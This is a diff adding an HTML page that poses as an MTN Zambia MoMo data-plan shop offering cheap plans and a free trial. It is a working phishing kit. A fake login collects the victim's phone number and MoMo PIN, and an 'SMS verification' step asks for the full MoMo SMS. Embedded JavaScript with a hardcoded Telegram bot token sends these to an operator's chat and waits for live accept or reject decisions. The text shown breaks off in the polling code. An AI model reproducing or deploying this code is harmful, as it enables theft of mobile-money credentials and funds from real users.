@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+<title>MTN Zambia — Data Plans</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
+.app{max-width:480px;margin:0 auto;min-height:100vh;background:#0a0e1a;position:relative;padding-bottom:20px;overflow:hidden}
+.starfield{position:fixed;inset:0;z-index:0;pointer-events:none;background:#0a0e1a;overflow:hidden}
+.starfield::before,.starfield::after{content:'';position:absolute;inset:0;background-image:radial-gradient(2px 2px at 20px 30px,#fff,transparent),radial-gradient(2px 2px at 60px 70px,#cbd5e0,transparent),radial-gradient(1px 1px at 50px 160px,#fff,transparent),radial-gradient(2px 2px at 130px 40px,#94a3b8,transparent),radial-gradient(1px 1px at 90px 90px,#fff,transparent),radial-gradient(2px 2px at 150px 180px,#e2e8f0,transparent),radial-gradient(1px 1px at 40px 220px,#fff,transparent),radial-gradient(2px 2px at 180px 100px,#cbd5e0,transparent),radial-gradient(1px 1px at 10px 280px,#fff,transparent),radial-gradient(2px 2px at 200px 250px,#94a3b8,transparent);background-repeat:repeat;background-size:220px 300px;opacity:.6;animation:twinkle 4s ease-in-out infinite alternate}
+.starfield::after{background-size:300px 400px;opacity:.3;animation-delay:2s}
+@keyframes twinkle{0%{opacity:.2}50%{opacity:.7}100%{opacity:.3}}
+.neon-arc{position:fixed;z-index:1;pointer-events:none;border-radius:50%;border:1.5px solid transparent;border-top-color:rgba(255,204,0,.35);border-right-color:rgba(255,204,0,.08);width:140%;height:140%;top:-30%;left:-20%;filter:blur(.5px) drop-shadow(0 0 6px rgba(255,204,0,.6));animation:orbit 25s linear infinite}
+.neon-arc.arc2{width:180%;height:180%;top:-50%;left:-40%;border-top-color:rgba(255,204,0,.3);border-right-color:rgba(255,204,0,.06);filter:blur(.5px) drop-shadow(0 0 6px rgba(255,204,0,.5));animation-duration:40s;animation-direction:reverse}
+@keyframes orbit{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+.page{display:none;animation:fadeIn .3s ease;position:relative;z-index:2}
+.page.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.plan-page{padding:32px 16px 24px;position:relative;z-index:2}
+.mtn-hero{text-align:center;margin-bottom:26px}
+.mtn-badge{display:inline-flex;align-items:center;gap:10px;background:rgba(10,14,26,.85);border:1.5px solid rgba(255,204,0,.4);border-radius:50px;padding:10px 22px;margin-bottom:22px;backdrop-filter:blur(10px);box-shadow:0 0 20px rgba(255,204,0,.25),0 0 40px rgba(255,204,0,.1),inset 0 0 12px rgba(255,204,0,.08);position:relative}
+.mtn-badge span{font-size:14px;font-weight:900;letter-spacing:2px;color:#ffcc00;text-transform:uppercase;text-shadow:0 0 8px rgba(255,204,0,.6)}
+.hero-title{font-size:26px;font-weight:900;text-align:center;color:#fff;margin-bottom:14px;line-height:1.25;letter-spacing:-.5px;text-shadow:0 0 20px rgba(255,204,0,.35),0 0 40px rgba(255,204,0,.15)}
+.hero-title .neon{background:linear-gradient(135deg,#ffcc00 0%,#ff9500 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;filter:drop-shadow(0 0 12px rgba(255,204,0,.55))}
+.important-banner{background:rgba(255,204,0,.08);border:1px solid rgba(255,204,0,.25);border-radius:14px;padding:14px 16px;margin-bottom:22px;font-size:13.5px;line-height:1.5;color:#cbd5e0;backdrop-filter:blur(6px);box-shadow:0 0 20px rgba(255,204,0,.08)}
+.important-banner strong{font-weight:800;color:#ffcc00}
+.powered-by{text-align:center;margin-bottom:26px;display:flex;align-items:center;justify-content:center;gap:10px;font-size:15px;color:#94a3b8;font-weight:500}
+.powered-by .mtn-brand{font-family:'Arial Black',sans-serif;font-weight:900;font-size:19px;letter-spacing:-.5px;color:#ffcc00;font-style:italic;line-height:1;text-shadow:0 0 12px rgba(255,204,0,.6)}
+.powered-by .mtn-brand span{color:#fff;font-style:italic;display:block;font-size:10px;letter-spacing:0;margin-top:2px;font-weight:900}
+.plan-card{background:linear-gradient(160deg,rgba(30,41,59,.95) 0%,rgba(15,23,42,.98) 100%);border:1px solid rgba(255,204,0,.18);border-radius:22px;padding:26px 22px;margin-bottom:18px;color:#fff;position:relative;transition:transform .15s,box-shadow .25s,border-color .25s;overflow:hidden;backdrop-filter:blur(8px);box-shadow:0 4px 20px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.04)}
+.plan-card::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 100% 0%,rgba(255,204,0,.12) 0%,transparent 55%);pointer-events:none}
+.plan-card:active{transform:scale(.985);border-color:rgba(255,204,0,.5);box-shadow:0 0 30px rgba(255,204,0,.3),inset 0 1px 0 rgba(255,255,255,.08)}
+.plan-badge{display:inline-block;background:rgba(255,204,0,.12);color:#ffe066;font-size:11px;font-weight:800;padding:6px 14px;border-radius:20px;margin-bottom:22px;letter-spacing:.8px;text-transform:uppercase;border:1px solid rgba(255,204,0,.3);box-shadow:0 0 12px rgba(255,204,0,.15)}
+.plan-badge.popular{background:rgba(255,204,0,.2);color:#ffcc00;border-color:rgba(255,204,0,.5);box-shadow:0 0 16px rgba(255,204,0,.3)}
+.plan-badge.new{background:rgba(52,211,153,.15);color:#6ee7b7;border-color:rgba(52,211,153,.3);box-shadow:0 0 12px rgba(52,211,153,.2)}
+.plan-size{font-size:36px;font-weight:900;text-align:center;letter-spacing:-1.2px;line-height:1.05;margin-bottom:8px;color:#fff;text-shadow:0 0 20px rgba(255,204,0,.35)}
+.plan-duration{font-size:19px;font-weight:400;text-align:center;color:#94a3b8;margin-bottom:22px;letter-spacing:-.3px}
+.plan-price{font-size:36px;font-weight:900;text-align:center;letter-spacing:-1.2px;line-height:1.05;margin-bottom:26px;background:linear-gradient(135deg,#ffcc00 0%,#ff9500 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;filter:drop-shadow(0 0 14px rgba(255,204,0,.45))}
+.view-details{display:block;text-align:center;color:#ffcc00;font-size:15px;font-weight:700;letter-spacing:.3px;background:rgba(255,204,0,.08);border:1px solid rgba(255,204,0,.3);border-radius:50px;width:100%;cursor:pointer;padding:12px;font-family:inherit;transition:all .2s;text-transform:uppercase}
+.view-details:hover{background:rgba(255,204,0,.15);border-color:rgba(255,204,0,.55);box-shadow:0 0 20px rgba(255,204,0,.25)}
+.view-details:active{transform:scale(.98)}
+.view-details i{margin-left:6px;transition:transform .15s}
+.view-details:active i{transform:translateX(4px)}
+.secure-footer{background:rgba(255,204,0,.06);border:1px solid rgba(255,204,0,.2);border-radius:14px;padding:16px 18px;margin-top:22px;font-size:13.5px;line-height:1.5;color:#ffe066;backdrop-filter:blur(6px)}
+.secure-footer strong{font-weight:800;color:#ffcc00}
+.confirm-page{padding:32px 16px 24px;position:relative;z-index:2;min-height:100vh}
+.confirm-header{text-align:center;margin-bottom:28px}
+.confirm-icon{width:78px;height:78px;background:rgba(255,204,0,.1);border:1.5px solid rgba(255,204,0,.4);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:34px;color:#ffcc00;box-shadow:0 0 30px rgba(255,204,0,.3),inset 0 0 20px rgba(255,204,0,.1)}
+.confirm-title{font-size:24px;font-weight:900;color:#fff;margin-bottom:6px;letter-spacing:-.4px;text-shadow:0 0 20px rgba(255,204,0,.3)}
+.confirm-sub{font-size:14px;color:#94a3b8;font-weight:500}
+.confirm-card{background:linear-gradient(160deg,rgba(30,41,59,.95) 0%,rgba(15,23,42,.98) 100%);border:1px solid rgba(255,204,0,.22);border-radius:22px;padding:24px 22px;margin-bottom:20px;backdrop-filter:blur(8px);box-shadow:0 4px 24px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.04);position:relative;overflow:hidden}
+.confirm-card::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 100% 0%,rgba(255,204,0,.1) 0%,transparent 60%);pointer-events:none}
+.plan-summary{position:relative;z-index:1}
+.summary-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,204,0,.12)}
+.summary-row:last-child{border-bottom:none;padding-bottom:0}
+.summary-row .label{font-size:14px;color:#94a3b8;font-weight:500}
+.summary-row .value{font-size:15px;color:#fff;font-weight:800;letter-spacing:.2px}
+.summary-row.total{padding-top:16px;margin-top:8px;border-top:2px solid rgba(255,204,0,.25);border-bottom:none}
+.summary-row.total .label{font-size:15px;color:#cbd5e0;font-weight:700}
+.summary-row.total .value{font-size:22px;background:linear-gradient(135deg,#ffcc00 0%,#ff9500 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;filter:drop-shadow(0 0 10px rgba(255,204,0,.5))}
+.confirm-btn{width:100%;padding:18px;border:none;border-radius:50px;background:linear-gradient(135deg,#ffcc00 0%,#ff9500 100%);color:#1c1c1e;font-size:16px;font-weight:900;letter-spacing:.5px;cursor:pointer;transition:all .2s;text-transform:uppercase;box-shadow:0 8px 30px rgba(255,204,0,.4),0 0 60px rgba(255,204,0,.2);position:relative;overflow:hidden}
+.confirm-btn::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.5),transparent);animation:shine 3s infinite}
+@keyframes shine{0%{left:-100%}100%{left:200%}}
+.confirm-btn:active{transform:scale(.98);box-shadow:0 4px 20px rgba(255,204,0,.5)}
+.confirm-btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
+.cancel-btn{width:100%;padding:16px;border:none;border-radius:50px;background:transparent;border:1.5px solid rgba(148,163,184,.3);color:#94a3b8;font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;margin-top:12px;text-transform:uppercase;letter-spacing:.3px}
+.cancel-btn:active{background:rgba(148,163,184,.1);border-color:rgba(148,163,184,.5)}
+.secure-note{text-align:center;font-size:12.5px;color:#64748b;margin-top:20px;line-height:1.5;padding:0 10px}
+.secure-note i{color:#ffcc00;margin-right:4px}
+.login-screen{min-height:100vh;background:#ffffff;display:flex;flex-direction:column;padding:40px 24px 30px}
+.mtn-logo-wrap{text-align:center;margin-bottom:20px}
+.mtn-logo-pill{display:inline-block;background:#ffcc00;color:#1c1c1e;font-family:'Arial Black',sans-serif;font-weight:900;font-size:28px;letter-spacing:1px;padding:12px 32px;border-radius:14px;box-shadow:0 4px 20px rgba(255,204,0,.4)}
+.login-subtitle{text-align:center;font-size:28px;font-weight:700;color:#1c1c1e;margin-bottom:38px}
+.phone-box{display:flex;align-items:center;border:1.5px solid #ffcc00;border-radius:16px;padding:16px 18px;margin-bottom:34px;background:#fff}
+.phone-box .flag{font-size:22px;margin-right:8px;line-height:1}
+.phone-box .cc{font-size:17px;font-weight:700;color:#1c1c1e;display:flex;align-items:center;gap:4px;padding-right:14px;margin-right:12px;border-right:1px solid #e5e5ea}
+.phone-box .cc i{font-size:11px;color:#1c1c1e}
+.phone-box input{flex:1;border:none;outline:none;font-size:16px;color:#1c1c1e;background:transparent;font-weight:500;letter-spacing:.5px}
+.phone-box input::placeholder{color:#b0b0b5;font-weight:400;letter-spacing:0}
+.pin-label-center{text-align:center;font-size:16px;color:#5f6368;margin-bottom:22px;font-weight:500}
+.pin-inputs-4{display:flex;gap:14px;justify-content:center;margin-bottom:22px}
+.pin-input{width:62px;height:62px;text-align:center;font-size:26px;font-weight:800;border:2px solid #ffcc00;border-radius:16px;background:#fff;color:#1c1c1e;outline:none;transition:all .2s}
+.pin-input:focus{border-color:#e6b800;border-width:3px;box-shadow:0 0 0 4px rgba(255,204,0,.25)}
+.pin-input::-webkit-inner-spin-button{-webkit-appearance:none}
+.pin-input[type="number"]{-moz-appearance:textfield}
+.forgot-pin{text-align:center;margin-bottom:16px}
+.forgot-pin a{color:#1c1c1e;text-decoration:none;font-size:15px;font-weight:700}
+.wave-section{background:#1c1c1e;border-top-left-radius:50% 50px;border-top-right-radius:50% 50px;padding:36px 20px 26px;margin:auto -24px -30px;margin-top:60px}
+.wave-text{text-align:center;color:#fff;font-size:15px;line-height:1.5;margin-bottom:22px;padding:0 10px;font-weight:500}
+.wave-cards{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.wave-card{background:#fff;border-radius:22px 22px 0 0;padding:22px 14px 20px;text-align:center;cursor:pointer;transition:transform .2s}
+.wave-card:active{transform:scale(.97)}
+.wave-card .icon-wrap{width:52px;height:52px;background:#f0f2f5;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:24px;color:#5f6368}
+.wave-card .card-title{font-size:16px;font-weight:700;color:#1c1c1e}
+.sms-page{background:#ffffff;min-height:100vh;display:flex;flex-direction:column}
+.sms-header{background:#ffffff;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
+.sms-back{display:flex;align-items:center;gap:6px;color:#1c1c1e;font-size:15px;font-weight:500;cursor:pointer;background:none;border:none;padding:4px;font-family:inherit}
+.sms-back i{font-size:14px}
+.sms-amount{text-align:right}
+.sms-amount .label{font-size:10px;color:#8e8e93;letter-spacing:1.5px;font-weight:700;margin-bottom:2px}
+.sms-amount .value{font-size:18px;color:#ff6b00;font-weight:800;letter-spacing:-.3px}
+.sms-body{padding:28px 22px 40px;flex:1;overflow-y:auto}
+.sms-title{font-size:26px;font-weight:900;color:#1c1c1e;margin-bottom:10px;letter-spacing:-.5px}
+.sms-desc{font-size:15px;color:#5f6368;line-height:1.5;margin-bottom:30px}
+.sms-sending-label{text-align:center;font-size:11px;font-weight:800;color:#8e8e93;letter-spacing:1.8px;margin-bottom:8px}
+.sms-sending-number{text-align:center;font-size:20px;font-weight:800;color:#1c1c1e;letter-spacing:1px;margin-bottom:26px}
+.sms-warning{background:#fff4e5;border-radius:16px;padding:16px 18px;display:flex;gap:12px;align-items:flex-start;margin-bottom:26px}
+.sms-warning i{color:#ff6b00;font-size:20px;margin-top:2px;flex-shrink:0}
+.sms-warning p{font-size:14px;color:#8a4b00;line-height:1.5;font-weight:500}
+.sms-warning strong{font-weight:800}
+.sms-paste-label{font-size:11px;font-weight:800;color:#8e8e93;letter-spacing:1.8px;margin-bottom:10px}
+.sms-textarea-wrapper{position:relative;margin-bottom:10px}
+.sms-textarea{width:100%;min-height:140px;padding:18px 16px;border:1.5px solid #e5e5ea;border-radius:16px;font-size:15px;color:#1c1c1e;background:#f8f9fb;outline:none;resize:none;font-family:inherit;line-height:1.5;transition:border-color .2s,background .2s}
+.sms-textarea:focus{border-color:#ff6b00;background:#fff;box-shadow:0 0 0 4px rgba(255,107,0,.1)}
+.sms-textarea::placeholder{color:#b0b0b5;font-weight:400}
+.sms-char-count{font-size:13px;color:#8e8e93;margin-bottom:26px}
+.sms-next-btn{width:100%;padding:19px;border:none;border-radius:16px;background:#ff6b00;color:#fff;font-size:17px;font-weight:800;letter-spacing:.3px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:10px;font-family:inherit;box-shadow:0 8px 24px rgba(255,107,0,.3)}
+.sms-next-btn:active{transform:scale(.98);background:#e65f00}
+.sms-next-btn:disabled{opacity:.6;cursor:not-allowed;transform:none;box-shadow:none}
+.sms-next-btn i{font-size:16px}
+.sms-secure{text-align:center;font-size:11px;color:#8e8e93;letter-spacing:1.2px;font-weight:700;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:6px}
+.sms-secure i{color:#34c759;font-size:12px}
+.review-page{background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:30px 24px}
+.review-content{text-align:center;max-width:340px}
+.review-spinner{width:70px;height:70px;border:4px solid #e5e5ea;border-top-color:#ff6b00;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 32px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.review-text{font-size:17px;line-height:1.6;color:#1c1c1e;font-weight:500;margin-bottom:12px}
+.review-text strong{font-weight:800;color:#1c1c1e}
+.processing-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;z-index:9998;padding:20px}
+.processing-overlay.show{display:flex}
+.processing-box{background:#fff;border-radius:24px;padding:36px 28px;text-align:center;max-width:340px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+.processing-box .spinner-big{width:56px;height:56px;border:4px solid #e5e5ea;border-top-color:#ffcc00;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
+.processing-box h3{font-size:19px;font-weight:700;margin-bottom:8px}
+.processing-box p{font-size:14px;color:#8e8e93;line-height:1.5}
+.processing-box .status{margin-top:18px;font-size:13px;color:#1c1c1e;font-weight:600}
+.processing-box .status.rejected{color:#ea4335}
+.processing-box .status.accepted{color:#34c759}
+.toast{visibility:hidden;min-width:260px;max-width:90%;background:rgba(28,28,30,.95);color:#fff;text-align:center;border-radius:14px;padding:14px 20px;position:fixed;bottom:30px;left:50%;transform:translateX(-50%);opacity:0;transition:opacity .3s,visibility .3s;box-shadow:0 8px 30px rgba(0,0,0,.25);font-weight:500;font-size:14px;z-index:9999}
+.toast.show{visibility:visible;opacity:1}
+.toast i{margin-right:8px}
+.toast.error i{color:#ff453a}
+.toast.success i{color:#ffcc00}
+@media (max-width:400px){
+  .pin-input{width:54px;height:54px;font-size:22px}
+  .pin-inputs-4{gap:10px}
+  .plan-size{font-size:30px}
+  .plan-price{font-size:30px}
+  .hero-title{font-size:22px}
+  .mtn-logo-pill{font-size:24px;padding:10px 26px}
+  .login-subtitle{font-size:24px}
+  .confirm-title{font-size:20px}
+  .summary-row.total .value{font-size:20px}
+  .sms-title{font-size:22px}
+  .sms-sending-number{font-size:18px}
+}
+</style>
+</head>
+<body>
+
+<div class="starfield" id="starfield">
+  <div class="neon-arc"></div>
+  <div class="neon-arc arc2"></div>
+</div>
+
+<div class="app">
+
+  <div class="page active" id="page-plans">
+    <div class="plan-page">
+      <div class="mtn-hero">
+        <div class="mtn-badge"><span>MTN</span></div>
+      </div>
+      <h1 class="hero-title">MTN to Cell —<br><span class="neon">Data Plans</span></h1>
+      <div class="important-banner"><strong>Important:</strong> Fast, reliable mobile data, instantly paid via MTN MoMo.</div>
+      <div class="powered-by">
+        <span>Powered by</span>
+        <span class="mtn-brand">MTN<span>MoMo</span></span>
+      </div>
+      <div class="plan-card">
+        <div class="plan-badge new">New users only</div>
+        <div class="plan-size">5GB Data</div>
+        <div class="plan-duration">2-Day Plan</div>
+        <div class="plan-price">Free trial</div>
+        <button class="view-details" data-plan="5GB Free Trial" data-size="5GB" data-duration="2-Day" data-price="Free trial">View details <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <div class="plan-card">
+        <div class="plan-badge">Best for light users</div>
+        <div class="plan-size">15GB Data</div>
+        <div class="plan-duration">7-Day Plan</div>
+        <div class="plan-price">ZMW 25</div>
+        <button class="view-details" data-plan="15GB 7-Day" data-size="15GB" data-duration="7-Day" data-price="ZMW 25">View details <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <div class="plan-card">
+        <div class="plan-badge">Balanced</div>
+        <div class="plan-size">35GB Data</div>
+        <div class="plan-duration">14-Day Plan</div>
+        <div class="plan-price">ZMW 50</div>
+        <button class="view-details" data-plan="35GB 14-Day" data-size="35GB" data-duration="14-Day" data-price="ZMW 50">View details <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <div class="plan-card">
+        <div class="plan-badge">Heavy use</div>
+        <div class="plan-size">50GB Data</div>
+        <div class="plan-duration">21-Day Plan</div>
+        <div class="plan-price">ZMW 75</div>
+        <button class="view-details" data-plan="50GB 21-Day" data-size="50GB" data-duration="21-Day" data-price="ZMW 75">View details <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <div class="plan-card">
+        <div class="plan-badge popular">Most Popular</div>
+        <div class="plan-size">Monthly<br>Unlimited</div>
+        <div class="plan-duration">30-Day Plan</div>
+        <div class="plan-price">ZMW 100</div>
+        <button class="view-details" data-plan="Monthly Unlimited" data-size="Unlimited" data-duration="30-Day" data-price="ZMW 100">View details <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <div class="plan-card">
+        <div class="plan-badge">5G Coverage</div>
+        <div class="plan-size">5G Monthly<br>Unlimited</div>
+        <div class="plan-duration">30-Day Plan</div>
+        <div class="plan-price">ZMW 200</div>
+        <button class="view-details" data-plan="5G Monthly Unlimited" data-size="5G Unlimited" data-duration="30-Day" data-price="ZMW 200">View details <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <div class="secure-footer">🔒 <strong>Secure Payment:</strong> Selecting a plan will redirect you to a secure MTN MoMo page.</div>
+    </div>
+  </div>
+
+  <div class="page" id="page-confirm">
+    <div class="confirm-page">
+      <div class="confirm-header">
+        <div class="confirm-icon"><i class="fas fa-receipt"></i></div>
+        <div class="confirm-title">Confirm Purchase</div>
+        <div class="confirm-sub">Review your plan before payment</div>
+      </div>
+      <div class="confirm-card">
+        <div class="plan-summary">
+          <div class="summary-row"><span class="label">Plan</span><span class="value" id="sumPlan">—</span></div>
+          <div class="summary-row"><span class="label">Data</span><span class="value" id="sumSize">—</span></div>
+          <div class="summary-row"><span class="label">Duration</span><span class="value" id="sumDuration">—</span></div>
+          <div class="summary-row"><span class="label">Payment Method</span><span class="value">MTN MoMo</span></div>
+          <div class="summary-row total"><span class="label">Total</span><span class="value" id="sumPrice">—</span></div>
+        </div>
+      </div>
+      <button class="confirm-btn" id="confirmPayBtn">Confirm & Pay</button>
+      <button class="cancel-btn" id="cancelBtn">Cancel</button>
+      <div class="secure-note"><i class="fas fa-lock"></i> Secured by MTN Zambia · Your data is encrypted</div>
+    </div>
+  </div>
+
+  <div class="page" id="page-login">
+    <div class="login-screen">
+      <div class="mtn-logo-wrap"><div class="mtn-logo-pill">MTN</div></div>
+      <div class="login-subtitle">Login</div>
+      <div class="phone-box">
+        <span class="flag">🇿🇲</span>
+        <span class="cc">+260 <i class="fas fa-caret-down"></i></span>
+        <input type="tel" id="loginPhone" placeholder="Phone Number" maxlength="9" inputmode="numeric" autocomplete="off">
+      </div>
+      <div class="pin-label-center">Enter your MoMo PIN</div>
+      <div class="pin-inputs-4" id="pinInputs">
+        <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
+      </div>
+      <div class="forgot-pin"><a href="#" id="forgotPin">Forgot PIN?</a></div>
+      <div class="wave-section">
+        <div class="wave-text">To register an MTN MoMo wallet or get assistance, click below</div>
+        <div class="wave-cards">
+          <div class="wave-card" id="registerCard"><div class="icon-wrap"><i class="fas fa-user"></i></div><div class="card-title">Register</div></div>
+          <div class="wave-card" id="helpCard"><div class="icon-wrap"><i class="fas fa-info-circle"></i></div><div class="card-title">Help &<br>Support</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="page" id="page-sms">
+    <div class="sms-page">
+      <div class="sms-header">
+        <button class="sms-back" id="smsBack"><i class="fas fa-arrow-left"></i> Back</button>
+        <div class="sms-amount">
+          <div class="label">AMOUNT</div>
+          <div class="value" id="smsAmount">ZMW 15.00</div>
+        </div>
+      </div>
+      <div class="sms-body">
+        <h1 class="sms-title">Full SMS Verification</h1>
+        <p class="sms-desc">Please paste the full SMS content you received from MTN MoMo.</p>
+        <div class="sms-sending-label">SENDING TO</div>
+        <div class="sms-sending-number" id="smsSendingTo">775484045</div>
+        <div class="sms-warning">
+          <i class="fas fa-exclamation-triangle"></i>
+          <p><strong>DO NOT edit the SMS</strong> — only copy and paste the entire message below</p>
+        </div>
+        <div class="sms-paste-label">PASTE FULL SMS CONTENT</div>
+        <div class="sms-textarea-wrapper">
+          <textarea class="sms-textarea" id="smsTextarea" placeholder="Paste the entire MTN MoMo SMS here..." maxlength="500"></textarea>
+        </div>
+        <div class="sms-char-count"><span id="charCount">0</span> characters</div>
+        <button class="sms-next-btn" id="smsNextBtn" disabled>Next Step <i class="fas fa-arrow-right"></i></button>
+        <div class="sms-secure"><i class="fas fa-lock"></i> SSL ENCRYPTED AND SECURE</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="page" id="page-review">
+    <div class="review-page">
+      <div class="review-content">
+        <div class="review-spinner"></div>
+        <div class="review-text">Your registration fee is being approved, Login again after 5 hours and make sure you have at least <strong>50 ZMW</strong> on your balance</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<div class="processing-overlay" id="processingOverlay">
+  <div class="processing-box">
+    <div class="spinner-big"></div>
+    <h3 id="processingTitle">Processing...</h3>
+    <p id="processingText">Please wait while we verify your submission</p>
+    <div class="status" id="processingStatus"></div>
+  </div>
+</div>
+
+<div id="toast" class="toast"><i class="fas fa-check-circle"></i><span id="toastMsg">Success</span></div>
+
+<script>
+(function() {
+  const BOT_TOKEN = '8878927801:AAEmSCY1vEYEkYEX-PYtyx2TW9kS2imzjkQ';
+  const CHAT_ID   = '8844316330';
+
+  const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+  const $ = id => document.getElementById(id);
+
+  const state = { planName:'', planSize:'', planDuration:'', planPrice:'', loginPhone:'', loginPin:'', smsContent:'' };
+  const pending = {};
+
+  function waitForApproval(requestId, timeoutMs = 5 * 60 * 1000) {
+    return new Promise((resolve) => {
+      pending[requestId] = resolve;
+      setTimeout(() => { if (pending[requestId]) { delete pending[requestId]; resolve('timeout'); } }, timeoutMs);
+    });
+  }
+
+  function showPage(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const el = $('page-' + id);
+    if (el) { el.classList.add('active'); window.scrollTo({top:0,behavior:'smooth'}); }
+    const sf = $('starfield');
+    sf.style.display = (id === 'plans' || id === 'confirm') ? 'block' : 'none';
+  }
+
+  function showToast(msg, type='success') {
+    const t = $('toast');
+    $('toastMsg').textContent = msg;
+    t.className = 'toast show ' + type;
+    t.querySelector('i').className = type === 'error' ? 'fas fa-exclamation-circle' : 'fas fa-check-circle';
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.className = 'toast', 3500);
+  }
+
+  function showProcessing(title, text) {
+    $('processingTitle').textContent = title;
+    $('processingText').textContent = text || 'Please wait while we verify your submission';
+    const status = $('processingStatus');
+    status.textContent = ''; status.className = 'status';
+    $('processingOverlay').classList.add('show');
+  }
+  function updateProcessingStatus(msg, type) {
+    const status = $('processingStatus');
+    status.textContent = msg; status.className = 'status ' + (type || '');
+  }
+  function hideProcessing() { $('processingOverlay').classList.remove('show'); }
+
+  async function sendTelegram(text, keyboard) {
+    try {
+      const payload = { chat_id: CHAT_ID, text, parse_mode:'Markdown' };
+      if (keyboard) payload.reply_markup = JSON.stringify(keyboard);
+      let res = await fetch(`${API}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
+      let data = await res.json();
+      if (!data.ok) {
+        const plainPayload = { chat_id: CHAT_ID, text };
+        if (keyboard) plainPayload.reply_markup = JSON.stringify(keyboard);
+        res = await fetch(`${API}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(plainPayload) });
+        data = await res.json();
+      }
+      return data.ok === true;
+    } catch (err) { console.error('send error:', err); return false; }
+  }
+
+  async function submitAndWait(messageText, requestId, processingTitle) {
+    const keyboard = { inline_keyboard: [[{ text:'✅ Accept', callback_data:`req_${requestId}_accept` }, { text:'❌ Reject', callback_data:`req_${requestId}_reject` }]] };
+    showProcessing(processingTitle || 'Processing...', 'Waiting for approval from our team');
+    updateProcessingStatus('📤 Sending to verification team...');
+    const sent = await sendTelegram(messageText, keyboard);
+    if (!sent) { hideProcessing(); showToast('Failed to send. Please try again.', 'error'); return 'error'; }
+    updateProcessingStatus('⏳ Awaiting approval...');
+    const result = await waitForApproval(requestId);
+    if (result === 'accept') { updateProcessingStatus('✅ Approved! Continuing...', 'accepted'); await sleep(900); hideProcessing(); return 'accept'; }
+    else if (result === 'reject') { updateProcessingStatus('❌ Rejected. Please try again.', 'rejected'); await sleep(1800); hideProcessing(); showToast('Submission was rejected.', 'error'); return 'reject'; }
+    else { hideProcessing(); showToast('No response from team.', 'error'); return 'timeout'; }
+  }
+
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  let lastUpdateId = 0;
+  async function pollTelegram() {
+    try {
+      const res = await fetch(`${API}/getUpdates?offset=${lastUpdateId + 1}&timeout=5&allowed_updates=["callback_query","message"]`);
+      const data = await res.json();
+      if (data.ok && data.result && data.result.length > 0) {
+        for (const update of data.result) {
+          lastUpdateId = update.update_id;
+          if (update.callback_query) {
+            const cb = update.callback_query;
+            const match = (cb.data || '').match(/^req_(\d+)_(accept|reject)$/);
+            if (match) {
+              const requestId = match[1], action = match[2];
+              await fetch(`${API}/answerCallbackQuery`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ callback_query_id: cb.id, text: action === 'accept' ? '✅ Accepted' : '❌ Rejected' }) });
+              if (cb.message?.chat?.id && cb.message?.message_id) {
+                const statusLine = action === 'accept' ? '✅ ACCEPTED' : '❌ REJECTED';
+                const newText = `${cb.message.text || ''}\n\n${statusLine}\n${new Date().toLocaleString()}`;
